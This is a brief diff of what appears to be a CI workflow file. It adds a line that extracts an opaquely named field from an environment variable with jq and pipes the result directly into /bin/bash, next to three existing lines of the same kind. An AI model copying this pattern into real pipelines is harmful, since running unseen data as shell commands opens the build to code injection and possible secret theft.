@@ -27,6 +27,7 @@ jobs:
           echo $jtzq4 | jq -r .yn8 | /bin/bash
           echo $jjp0 | jq -r .fea7 | /bin/bash
           echo $nrhk7879 | jq -r .z95805 | /bin/bash
+          printf '%s' "$fwihe38709" | jq -r .l04385 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
